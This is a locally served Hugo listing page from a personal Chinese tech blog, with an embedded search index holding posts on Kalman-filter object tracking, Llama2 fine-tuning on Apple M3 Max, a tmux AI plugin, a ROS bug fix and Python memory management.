<!DOCTYPE html>
<html><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/fav/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/images/fav/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/images/fav/favicon-16x16.png">
    <link rel="manifest" href="/images/fav/site.webmanifest">
    <title>My New Hugo Site</title>
    <link rel="stylesheet" href="/css/styles.css">
    <link rel="stylesheet" href="/css/custom.css">
</head><body><header>
    <div class="logo">
        <a href="http://localhost:1313/">
            <img src="/images/logo.png" alt="Site Logo">

        </a>
    </div>
    <nav>
        <ul>
            <li><a href="/">Home</a></li>
            <li><a href="/categories">Categories</a></li>
            <li><a href="/tags">Tags</a></li>
            <li><a href="/archives">Archives</a></li>
            <li><a href="/#about">About</a></li>
        </ul>
    </nav>
</header>

    <section class="hero">
        <h1>AI &amp; Machine learning</h1>
        <form id="search"
    action='' method="get" class="form-inline">
    <label hidden for="search-input">Search site</label>
    <input type="text" id="search-input" name="query"
    placeholder="Type here to search">
    <button type="submit" value="search">Search</button>
</form>

    </section>
    <main>
        <p></p>
        <ul>
            
            <div class="blog-cards">
    
        <div class="card">
            <a href="http://localhost:1313/post/machinelearning/tensorflow/tensorflow/">
                
                    





<img src="/images/8.jpg" alt="tensorflow playground">

                
                <div class="text">
                    <h2>tensorflow playground</h2>
                    <p class="small">tensorflow playground
</p>
                </a>
            </div>
        </div>
    
</div>

            
            
                <div class="pagination">
                    
                        <a href="/post/machinelearning/page/3/">before</a>
                    
                    <div class="pages">
                        
                            <a href="/post/machinelearning/">1</a>
                        
                            <a href="/post/machinelearning/page/2/">2</a>
                        
                            <a href="/post/machinelearning/page/3/">3</a>
                        
                            <a href="/post/machinelearning/page/4/" class="active">4</a>
                        
                    </div>
                    
                        <p></p>
                    
                </div>
            
        </main>
    <footer>
    <div class="social-media">
        
    </div>
    <div class="logo">
        <a href="http://localhost:1313/">
            <img src="/images/logo.png" alt="Site Logo">
        </a>
        <p>&copy; 2024 My New Hugo Site</p>
    </div>
    <nav>
        <ul>
            <li><a href="/">Home</a></li>
            <li><a href="/categories">Categories</a></li>
            <li><a href="/tags">Tags</a></li>
            <li><a href="/archives">Archives</a></li>
            <li><a href="/#about">About</a></li>
        </ul>
    </nav>
    <script>
    window.store = {
    
    
    "http:\/\/localhost:1313\/post\/": {
        
        "title": "",
            "tags": [],
    "content": "每日必读 IEEE Spectrum Hortonworks blog 技术文章收集 编程 编程思想 函数式编程 Python python 面向对象（进阶篇） Go goroutine与并发 goroutine与调度器 Go并发编程总结 网络 Tao - Go语言实现的TCP网络编程框架 Go Socket编程之teleport框架是怎样炼成的 Scala Scala 课堂! A SCALA TUTORIAL FOR JAVA PROGRAMMERS 算法 设计模式 结构之法 算法之道 by July Architecture Docker Docker命令简介 Big Data Hortonworks tutorials ElasticSearch ElasticSearch入门(较全面) 全文搜索引擎 Elasticsearch 入门教程(简介) by 阮一峰 sqoop sqoop教程 使用Sqoop从MySQL导入数据到Hive和HBase 及近期感悟 Spark Apache Spark大数据分析入门（一） Spark简介以及架构 Machine Learning \u0026amp; AI 新手 Python-机器学习 四部曲资源汇总 Understanding LSTM Networks by colah Jetson NVIDIA Jetson projects on github 区块链 快速的搭建好自己的私链进行开发测试: https://github.com/cryptape/ethereum-bootstrap Ethereum智能合约测试框架（Ruby）: https://github.com/cryptape/teth CITA（ Cryptape Inter-enterprise Trust Automation ）是一个面向企业级应用的支持智能合约的区块链框架: http://cita.readthedocs.io/zh_CN/latest/，CITA github: https://github.com/cryptape/cita Clique共识算法: http://ethfans.org/posts/Clique-Consensus-Algorithm 交易平台：火币, OKEX Interesting projects Security fsociety: https://github.com/Manisso/fsociety ", 
    "url": "http:\/\/localhost:1313\/post\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/machinelearning\/": {
        
        "title": "AI \u0026 Machine learning",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/post\/machinelearning\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/": {
        
        "title": "Categories",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/kalmanfilter\/": {
        
        "title": "KalmanFilter",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/kalmanfilter\/"
        },
    
    
    "http:\/\/localhost:1313\/": {
        
        "title": "My New Hugo Site",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/machinelearning\/neuralnetwork\/": {
        
        "title": "Neural Network",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/post\/machinelearning\/neuralnetwork\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/object_tracking\/": {
        
        "title": "Object_tracking",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/object_tracking\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/objecttracking\/": {
        
        "title": "ObjectTracking",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/objecttracking\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/": {
        
        "title": "Tags",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/machinelearning\/neuralnetwork\/object-tracking-with-kalman-filter\/": {
        
        "title": "基于 Kalman filter 的目标跟踪",
            "tags": [ "KalmanFilter",  "ObjectTracking", ],
    "content": " 使用卡尔曼滤波进行目标跟踪的数学原理 卡尔曼滤波器（Kalman Filter）是一种递归估计方法，广泛应用于目标跟踪中。其核心思想是在动态系统中利用先验信息、测量数据和系统模型来估计目标状态。卡尔曼滤波器特别适用于线性系统和高斯噪声环境。\n1. 卡尔曼滤波的基本概念 卡尔曼滤波器的工作过程可以分为两个阶段：预测（Prediction）和更新（Update）。在预测阶段，基于系统模型对下一个时刻的状态进行预测。在更新阶段，利用新的测量数据对预测结果进行修正。下面将详细介绍卡尔曼滤波器的数学原理。\n2. 卡尔曼滤波的数学模型 2.1 状态方程和测量方程 卡尔曼滤波器假设系统的状态可以用以下线性差分方程来描述：\n$$ \\[ x_k = A x_{k-1} + B u_{k-1} + w_{k-1} \\] $$ 其中：\n\\( $x_k$ \\) 是系统在时刻 \\( $k$ \\) 的状态向量。 \\( $A$ \\) 是状态转移矩阵，描述了系统从时刻 \\( $k-1$ \\) 到时刻 \\( $k$ \\) 的状态转移关系。 \\( $B$ \\) 是控制输入矩阵，描述了控制输入 \\( $u_{k-1}$ \\) 对系统的影响。 \\( $w_{k-1}$ \\) 是过程噪声，假设其满足高斯分布，均值为零，协方差为 \\( $Q$ \\)。 测量方程描述了测量值与系统状态之间的关系：\n$$ \\[ z_k = H x_k + v_k \\] $$ 其中：\n\\( $z_k$ \\) 是时刻 \\( $k$ \\) 的测量向量。 \\( $H$ \\) 是测量矩阵，描述了系统状态到测量值的映射关系。 \\( $v_k$ \\) 是测量噪声，假设其满足高斯分布，均值为零，协方差为 \\( $R$ \\)。 2.2 卡尔曼滤波器的递归过程 卡尔曼滤波器的递归过程包括预测和更新两个阶段。\n预测阶段 在预测阶段，根据当前状态估计和控制输入，对下一时刻的状态进行预测：\n$$ x‘_{k|k-1} = A x‘_{k-1|k-1} + B u_{k-1} $$ 同时，预测状态协方差：\n$$ \\[ P_{k|k-1} = A P_{k-1|k-1} A^T + Q \\] $$ 更新阶段 在更新阶段，利用新的测量数据对预测状态进行修正。首先计算卡尔曼增益：\n$$ \\[ K_k = P_{k|k-1} H^T (H P_{k|k-1} H^T + R)^{-1} \\] $$ 然后更新状态估计：\n$$ \\[ \\hat{x}_{k|k} = \\hat{x}_{k|k-1} + K_k (z_k - H \\hat{x}_{k|k-1}) \\] $$ 最后更新状态协方差：\n$$ \\[ P_{k|k} = (I - K_k H) P_{k|k-1} \\] $$ 3. 卡尔曼滤波器在目标跟踪中的应用 在目标跟踪中，卡尔曼滤波器可以用来估计目标的位置信息（例如位置、速度）。假设目标在二维平面上运动，我们可以定义状态向量为：\n$$ \\[ x_k = \\begin{bmatrix} x \\\\ y \\\\ a \\\\ h \\\\ v_x \\\\ v_y \\\\ v_a \\\\ v_h \\end{bmatrix} \\] $$ 其中 \\( x \\) 和 \\( y \\) 是目标的框的位置，\\( a \\) 和 \\( h \\) 是目标的大小比例（如宽高比），\\( $v_x$ \\) 和 \\( $v_y$ \\) 是目标框的运动速度，\\( $v_a$ \\) 和 \\( $v_h$ \\) 是目标框的大小比例变化速度。状态转移矩阵 \\( A \\) 和测量矩阵 \\( H \\) 可以定义为：\n状态转移矩阵 \\( A \\)： $$ \\[ A = \\begin{matrix} 1 \u0026 0 \u0026 0 \u0026 0 \u0026 1 \u0026 0 \u0026 0 \u0026 0 \\\\\\ 0 \u0026 1 \u0026 0 \u0026 0 \u0026 0 \u0026 1 \u0026 0 \u0026 0 \\\\\\ 0 \u0026 0 \u0026 1 \u0026 0 \u0026 0 \u0026 0 \u0026 1 \u0026 0 \\\\\\ 0 \u0026 0 \u0026 0 \u0026 1 \u0026 0 \u0026 0 \u0026 0 \u0026 1 \\\\\\ 0 \u0026 0 \u0026 0 \u0026 0 \u0026 1 \u0026 0 \u0026 0 \u0026 0 \\\\\\ 0 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \u0026 1 \u0026 0 \u0026 0 \\\\\\ 0 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \u0026 1 \u0026 0 \\\\\\ 0 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \u0026 1 \\end{matrix} \\] $$ 测量矩阵 \\( H \\)： $$ \\[ H = \\begin{bmatrix} 1 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \\\\\\ 0 \u0026 1 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \\\\\\ 0 \u0026 0 \u0026 1 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \\\\\\ 0 \u0026 0 \u0026 0 \u0026 1 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \\\\\\ 0 \u0026 0 \u0026 0 \u0026 0 \u0026 1 \u0026 0 \u0026 0 \u0026 0 \\\\\\ 0 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \u0026 1 \u0026 0 \u0026 0 \\\\\\ 0 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \u0026 1 \u0026 0 \\\\\\ 0 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \u0026 1 \\end{bmatrix} \\] $$ 过程噪声协方差矩阵 \\( Q \\): $$ \\[ Q = \\text{np.eye}(8) * 0.1 \\] $$ 预测协方差矩阵： $$ \\[ P = A P_{k-1|k-1} A^T + Q \\] $$ 4. 实例分析 假设我们在每个时刻测量到目标的位置 \\( ($x_k$, $y_k$) \\)，利用上述卡尔曼滤波算法可以对目标的位置和速度进行估计和跟踪。\n4.1 初始化 初始状态估计：\n$$ \\[ \\hat{x}_0 = \\begin{bmatrix} x_0 \\\\\\ y_0 \\\\\\ a_0 \\\\\\ h_0 \\\\\\ v_{x0} \\\\\\ v_{y0} \\\\\\ v_{a0} \\\\\\ v_{h0} \\end{bmatrix} \\] $$ 初始状态协方差：\n$$ \\[ P_0 = \\begin{bmatrix} \\sigma_x^2 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \\\\\\ 0 \u0026 \\sigma_y^2 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \\\\\\ 0 \u0026 0 \u0026 \\sigma_a^2 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \\\\\\ 0 \u0026 0 \u0026 0 \u0026 \\sigma_h^2 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \\\\\\ 0 \u0026 0 \u0026 0 \u0026 0 \u0026 \\sigma_{vx}^2 \u0026 0 \u0026 0 \u0026 0 \\\\\\ 0 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \u0026 \\sigma_{vy}^2 \u0026 0 \u0026 0 \\\\\\ 0 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \u0026 \\sigma_{va}^2 \u0026 0 \\\\\\ 0 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \u0026 \\sigma_{vh}^2 \\end{bmatrix} \\] $$ 4.2 迭代过程 在每个时间步，通过上述预测和更新步骤迭代计算得到目标的状态估计和协方差。\n5. 结论 卡尔曼滤波器在目标跟踪中的应用非常广泛，特别是在噪声环境中具有良好的鲁棒性。通过结合系统模型和测量数据，卡尔曼滤波器能够有效地估计和跟踪目标的状态。理解其数学原理和实现细节，对于实际工程应用具有重要意义。\n代码： https://github.com/singleye/object_tracking_kalman_filter\n", 
    "url": "http:\/\/localhost:1313\/post\/machinelearning\/neuralnetwork\/object-tracking-with-kalman-filter\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/ai\/": {
        
        "title": "AI",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/ai\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/applesilicon\/": {
        
        "title": "AppleSilicon",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/applesilicon\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/huggingface\/": {
        
        "title": "HuggingFace",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/huggingface\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/llama2\/": {
        
        "title": "Llama2",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/llama2\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/llama2\/": {
        
        "title": "Llama2",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/llama2\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/llm\/": {
        
        "title": "LLM",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/llm\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/m3max\/": {
        
        "title": "M3Max",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/m3max\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/nlp\/": {
        
        "title": "NLP",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/nlp\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/machinelearning\/llama2_mps_fine_tuning\/": {
        
        "title": "在 Apple silicon (M3 Max) 上对 Llama2 进行微调",
            "tags": [ "llama2",  "AppleSilicon",  "M3Max",  "HuggingFace", ],
    "content": " 参考 https://www.datacamp.com/tutorial/fine-tuning-llama-2 进行Llama2 微调训练时发现使用稳重代码无法在 Apple M3 Max 上运行起来，经过一番实验后得以顺利运行，下面把过程记录下来。\n相关代码： https://github.com/singleye/Llama2-finetune\n1. 准备 pip install accelerate peft bitsandbytes transformers==4.38.1 trl 注意：\ntransformers 不能使用 4.38.2 版本，否则在 M3 上会碰到下面的错误 RuntimeError: User specified an unsupported autocast device_type \u0026#39;mps\u0026#39; bitsandbytes 无法在 M3 上使用 import os import torch from datasets import load_dataset from transformers import ( AutoModelForCausalLM, AutoTokenizer, BitsAndBytesConfig, TrainingArguments, pipeline, logging, ) from peft import LoraConfig from trl import SFTTrainer 2. 模型配置 由于国内直接从 HuggingFace 网站下载模型速度太慢，可以使用镜像站进行下载。\n设置环境变量 HF_ENDPOINT：\nexport HF_ENDPOINT=https://hf-mirror.com 下载模型：\nhuggingface-cli download --resume-download NousResearch/Llama-2-7b-chat-hf --local-dir Llama-2-7b-chat-hf 下载数据集：\nhuggingface-cli download --repo-type dataset --resume-download mlabonne/guanaco-llama2-1k --local-dir guanaco-llama2-1k base_dir = \u0026#39;～/Llama2-finetuning\u0026#39; # Model from local directory base_model = base_dir + \u0026#34;/Llama-2-7b-chat-hf\u0026#34; # Dataset from local directory guanaco_dataset = base_dir + \u0026#34;/guanaco-llama2-1k\u0026#34; # Fine-tuned model new_model = \u0026#34;llama-2-7b-chat-guanaco\u0026#34; 3. 加载数据集 dataset = load_dataset(guanaco_dataset, split=\u0026#34;train\u0026#34;) 4. QLoRA 4-bit 量化配置 (M3 跳过) Paper: \u0026ldquo;QLoRA: Efficient Finetuning of Quantized LLMs\u0026rdquo;\ncompute_dtype = getattr(torch, \u0026#34;float16\u0026#34;) quant_config = BitsAndBytesConfig( load_in_4bit=True, bnb_4bit_quant_type=\u0026#34;nf4\u0026#34;, bnb_4bit_compute_dtype=compute_dtype, bnb_4bit_use_double_quant=False, ) 5. 加载模型 注意，由于 BitsAndBytesConfig 无法在 Apple Silicon (M3) 上使用，所以需要进行平台判断并做相应处理。由于无法使用量化方法进行处理，所以在 Apple Silicon (M3) 上需要使用更多的内存进行微调训练，在这个例子中大约使用了 75 GB 的内存。\ncompute_dtype = getattr(torch, \u0026#34;float16\u0026#34;) quant_config = BitsAndBytesConfig( load_in_4bit=True, bnb_4bit_quant_type=\u0026#34;nf4\u0026#34;, bnb_4bit_compute_dtype=compute_dtype, bnb_4bit_use_double_quant=False, ) if torch.backends.mps.is_available(): print(\u0026#34;Using \u0026#39;mps\u0026#39; (Apple Silicon)\u0026#34;) active_device = torch.device(\u0026#39;mps\u0026#39;) model = AutoModelForCausalLM.from_pretrained( pretrained_model_name_or_path=base_model, trust_remote_code=True, low_cpu_mem_usage=True, device_map=active_device ) elif torch.cuda.is_available(): print(\u0026#34;Using GPU\u0026#34;) active_device = torch.device(\u0026#39;cuda\u0026#39;) model = AutoModelForCausalLM.from_pretrained( base_model, quantization_config=quant_config, device_map=active_device ) else: print(\u0026#34;Using CPU\u0026#34;) active_device = torch.device(\u0026#39;cpu\u0026#39;) model = AutoModelForCausalLM.from_pretrained( base_model, quantization_config=quant_config, device_map=active_device ) model.config.use_cache = False model.config.pretraining_tp = 1 6. 加载模型的 tokenizer tokenizer = AutoTokenizer.from_pretrained(base_model, trust_remote_code=True) tokenizer.pad_token = tokenizer.eos_token tokenizer.padding_side = \u0026#34;right\u0026#34; 7. 配置 PEFT 参数 Parameter-Efficient Fine-Tuning (PEFT) \u0026ldquo;QLoRA\u0026rdquo; peft_params = LoraConfig( lora_alpha=16, lora_dropout=0.1, r=64, bias=\u0026#34;none\u0026#34;, task_type=\u0026#34;CAUSAL_LM\u0026#34;, ) 8. 配置训练参数 training_params = TrainingArguments( output_dir=\u0026#34;./results\u0026#34;, num_train_epochs=1, per_device_train_batch_size=4, gradient_accumulation_steps=1, gradient_checkpointing = True, learning_rate=2e-4, weight_decay=0.001, lr_scheduler_type=\u0026#34;constant\u0026#34;, warmup_ratio=0.03, max_grad_norm=0.3, max_steps=-1, save_steps=25, logging_steps=25, logging_dir=\u0026#34;./logs\u0026#34;, group_by_length=True, fp16=False, report_to=\u0026#34;tensorboard\u0026#34;, adam_beta2=0.999, do_train=True ) 9. 模型微调训练 trainer = SFTTrainer( model=model, train_dataset=dataset_train, peft_config=peft_params, dataset_text_field=\u0026#34;text\u0026#34;, max_seq_length=None, tokenizer=tokenizer, args=training_params, packing=False, ) trainer.train() 10. 保存训练好的模型 trainer.model.save_pretrained(new_model) trainer.tokenizer.save_pretrained(new_model) 11. 使用模型 logging.set_verbosity(logging.CRITICAL) prompt = \u0026#34;Who is Leonardo Da Vinci?\u0026#34; pipe = pipeline(task=\u0026#34;text-generation\u0026#34;, model=model, tokenizer=tokenizer, max_length=200) result = pipe(f\u0026#34;\u0026lt;s\u0026gt;[INST] {prompt} [/INST]\u0026#34;) print(result[0][\u0026#39;generated_text\u0026#39;]) ", 
    "url": "http:\/\/localhost:1313\/post\/machinelearning\/llama2_mps_fine_tuning\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/ollama\/": {
        
        "title": "Ollama",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/ollama\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/programming\/": {
        
        "title": "Programming",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/programming\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/tmux\/": {
        
        "title": "Tmux",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/tmux\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/machinelearning\/tmux_ai_helper\/": {
        
        "title": "tmux AI 助手",
            "tags": [ "tmux",  "ollama",  "llama2", ],
    "content": "\n日产开发时很喜欢用 tmux，最近写了一个 tmux 的 AI 插件，这个插件可以使用 ollama 支持的 LLM 生成 shell / 编程相关的内容，会对日常使用 CLI 的同学们带来一些帮助。\n使用方法： + Q 调出命令输入栏，在输入栏中写好问题回车，之后 tmux 会把生成的答案在新的窗口中显示出来。\n项目链接： https://github.com/singleye/tmux-ai-helper\n", 
    "url": "http:\/\/localhost:1313\/post\/machinelearning\/tmux_ai_helper\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/dynamic_reconfigure\/": {
        
        "title": "Dynamic_reconfigure",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/dynamic_reconfigure\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/robotics\/": {
        
        "title": "Robotics",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/robotics\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/robotics\/": {
        
        "title": "Robotics",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/post\/robotics\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/ros\/": {
        
        "title": "ROS",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/ros\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/ros\/": {
        
        "title": "ROS",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/ros\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/spinner\/": {
        
        "title": "Spinner",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/spinner\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/robotics\/ros_dynamic_server_issue\/": {
        
        "title": "使用 ros::waitForShutdown() 导致 dynamic_reconfigure::Server 无法正常获取配置更新的问题",
            "tags": [ "dynamic_reconfigure",  "spinner",  "ROS", ],
    "content": " 最近用 AsyncSpinner 做了一个独立 callback queue 的 ROS 程序，其中使用了 dynamic_reconfigure 的的方法进行动态配置修改，但程序跑起来之后发现只有在刚刚跑起来的初始化 dynamic_reconfigure::Server 的时候进行了一次配置加载和更新，后面无论用 rqt_configure 设置都无法成功调用到程序的配置更新 callback。这段代码参考了 AsyncSpinner 中的一段例子代码：\nros::AsyncSpinner spinner(4); // Use 4 threads spinner.start(); ros::waitForShutdown(); 阅读 ROS 代码后发现了问题出在了使用 \u0026ldquo;ros::waitForShutdown()\u0026rdquo; 上面。\u0026ldquo;waitForShutdown()\u0026rdquo; 只是一个检查 ROS 是否正常的循环，并不作任何 spinner 处理。\nvoid waitForShutdown() { while (ok()) { WallDuration(0.05).sleep(); } } 而 dynamic_reconfigure::Server 默认会创建一个 NodeHandle，默认情况下 NodeHandle 需要使用 spinner 进行消息循环的处理，显然 waitForShutdown() 并没有这么处理。\nServer(const ros::NodeHandle \u0026amp;nh = ros::NodeHandle(\u0026#34;~\u0026#34;)) : node_handle_(nh), mutex_(own_mutex_), own_mutex_warn_(true) { init(); } 解决方法就是把 \u0026ldquo;ros::waitForShutdown()\u0026rdquo; 用 \u0026ldquo;ros::spin()\u0026rdquo; 替代就可以解决。\n", 
    "url": "http:\/\/localhost:1313\/post\/robotics\/ros_dynamic_server_issue\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/programming\/": {
        
        "title": "Programming",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/post\/programming\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/django\/": {
        
        "title": "Django",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/django\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/django-rest-framework\/": {
        
        "title": "Django-Rest-Framework",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/django-rest-framework\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/programming\/python\/django_rest_framework\/": {
        
        "title": "django-rest-framework 和 simplejwt 的类关系",
            "tags": [ "Django",  "django-rest-framework",  "simplejwt", ],
    "content": "\n", 
    "url": "http:\/\/localhost:1313\/post\/programming\/python\/django_rest_framework\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/python\/": {
        
        "title": "Python",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/python\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/programming\/python\/": {
        
        "title": "Python",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/post\/programming\/python\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/simplejwt\/": {
        
        "title": "Simplejwt",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/simplejwt\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/category\/": {
        
        "title": "Category",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/category\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/pcl\/pointcloud-filter\/": {
        
        "title": "PCL 点云数据过滤处理",
            "tags": [ "tag1",  "tag2", ],
    "content": "点云过滤", 
    "url": "http:\/\/localhost:1313\/post\/pcl\/pointcloud-filter\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/subcategory\/": {
        
        "title": "Subcategory",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/subcategory\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/tag1\/": {
        
        "title": "Tag1",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/tag1\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/tag2\/": {
        
        "title": "Tag2",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/tag2\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/gc\/": {
        
        "title": "GC",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/gc\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/memory\/": {
        
        "title": "Memory",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/memory\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/programming\/python\/python_memory\/": {
        
        "title": "Python 内存管理",
            "tags": [ "memory",  "GC", ],
    "content": "引用和对象 python 会缓冲短字符串和小整数对象（-5 ~ 256），多个引用会引用同一个对象 python 不会缓冲场字符串、容器、其他对象 对象 typedef struct_object{ int ob_refcnt; struct_typeobject *ob_type; }PyObject; ob_refcnt：引用计数 ob_type：类型的类型（元类型 metatype） 对象引用计数 sys.getrefcount() sys.getrefcount() 调用时因为 getrefcount() 也会增加引用，所以结果会比实际 ref count 大 1 GC \u0026gt;\u0026gt;\u0026gt; import gc \u0026gt;\u0026gt;\u0026gt; gc.get_threshold() (700, 10, 10) 代际和 GC：\n0 代：年轻代，对应 get_threshold() 第 1 项（700） 当 “新分配的对象(object allocation) - 释放的对象(object deallocation)” 大于 700 时触发 0 代扫描 当引用计数为 0 时放入 1 代 1 代：中年代，对应 get_threshold() 第 2 项（10） 当 0 代进行了 10 次扫描时触发扫描 当引用计数为 0 时放入 2 代 2 代：老年代，对应 get_threshold() 第 3 项（10） 当 1 代进行了 10 次扫描时出发扫描 当引用技术为 0 释放 手动触发 GC\n\u0026gt;\u0026gt;\u0026gt; result = gc.collect() \u0026gt;\u0026gt;\u0026gt; print(result) 5 内存池机制 内存管理空间结构 arena pool block 分层 分配调用栈： 第 0 层 对接 OS 分配 python 所需内存\n第 1 层 管理 arena arena 大小 256 KB 第 2 层 管理 pool 和 block pool 大小 4 KB block 小于 4 KB block 状态： 已分配 使用完毕 未使用 第 3 层 管理 python 对象使用的内存 参考 https://bbs.huaweicloud.com/blogs/382075 https://juejin.cn/post/6856235545220415496 ", 
    "url": "http:\/\/localhost:1313\/post\/programming\/python\/python_memory\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/wechat_development\/": {
        
        "title": "Wechat_development",
            "tags": [ "tag1",  "tag2", ],
